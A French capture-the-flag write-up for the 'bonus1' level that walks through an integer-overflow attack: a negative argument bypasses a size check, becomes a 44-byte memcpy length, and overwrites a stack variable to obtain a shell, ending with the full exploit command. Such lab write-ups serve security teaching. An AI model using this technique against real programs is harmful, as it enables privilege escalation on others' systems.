Afin de resoudre ce challenge il y a deux etapes a passer:  
  
La premiere consiste a ecrire un nombre qui doit etre plus petit ou egale '9', qui sera ensuite multiplier par 4 et sera le troisieme argument de memcpy().  
  
Le deuxieme etape consiste a ecraser l adresse 0xbffff6fc qui devra avoir pour valeur 0x574f4c46, nous pouvons voir que cette adresse est le premiere argument de la fonction memcpy()+40 et le deuxieme argument de memcpy est argv[2].  
=> 0x08048473 <+79>:    call   0x8048320 <memcpy@plt>  
(gdb) x/wx $esp  
0xbffff6c0:     0xbffff6d4  
(gdb) x/wx $esp+0x3c  
0xbffff6fc:     0xc000000c  
(gdb) p/d 0xbffff6fc-0xbffff6d4  
$45 = 40  
  
  
Nous devons donc pouvoir ecrire 44 octets avec argv[2] a partir de 0xbffff6fc pour ecraser 0xbffff6fc.  
Seulement, si nous multiplions 9 par 4 nous obtenons 36, ce qui n est pas suffisant pour ecraser les donnees de l adresse que nous devons modifier.  
En m'inspirant de cette doc, j'ai exploiter une vulnerabiliter de type "Exploiting these weaknesses":  
https://blog.feabhas.com/2014/10/vulnerabilities-in-c-when-integers-go-bad/#Exploiting_these_weaknesses  
Memcpy prend un size_t en troisieme argument, qui n accepte pas les valeurs inferieur a zero. Du coup si nous mettons -1 en premier parametre et que nous le converitssons dans sa valeur unsigned, nous obtenons ceci:  
(gdb) p/x -1  
$11 = 0xffffffff  
(gdb) p/u 0xffffffff  
$12 = 4294967295  
Le p/u signifie que nous voulons le resultat en unsigned int.  
Nous pouvons voir que memcpy prend un troisieme parametre avec une taille impressionnante.
Nous sommes deja a -1, et nous voulons pouvoir ecrire 44 bytes (il nous reste donc 43 bytes), nous pouvons donc continuer dans le negatif afin de remmettre un signe negatif a cette valeur pour qu il redevienne positif:  
  
(gdb) p/u -(0xffffffff-43)  
$29 = 44  
  
Nous savons que le nombre sera multiplier par 4, vu que nous sommes en positif, nous devons de notre coter le diviser:  
  
(gdb) p/d (0xffffffff-43)
$33 = 4294967252
(gdb) p/d (0xffffffff-43)/4
$34 = 1073741813  
  
(gdb) p/d 4294967252%4  
$15 = 0  
  
Pour le modulo, ce n est pas trop important, on a une marge d erreur de 3 unites au dessus de 1073741813 vu que la division ne garde pas le reste.
  
(gdb) p/x -1073741813  
$37 = 0xc000000b  
  
Le premier c de 0xc000000b represente le bit de signe, negatif dans notre cas, du coup si on le passe en positif nous obtenons le chiffre 11 (11*4=44):
  
(gdb) p/u 0x0000000b  
$42 = 11  
  
Du coup, si nous passons notre variable en negatif, nous obtenons 11*4=44 dans le troisieme parametre du memcpy(), nous avons un beau shell avec les droits de l utilisateur bonus2:
  
./bonus1 -1073741813 $(python -c "print 'A' * 40 + '\x46\x4c\x4f\x57'")
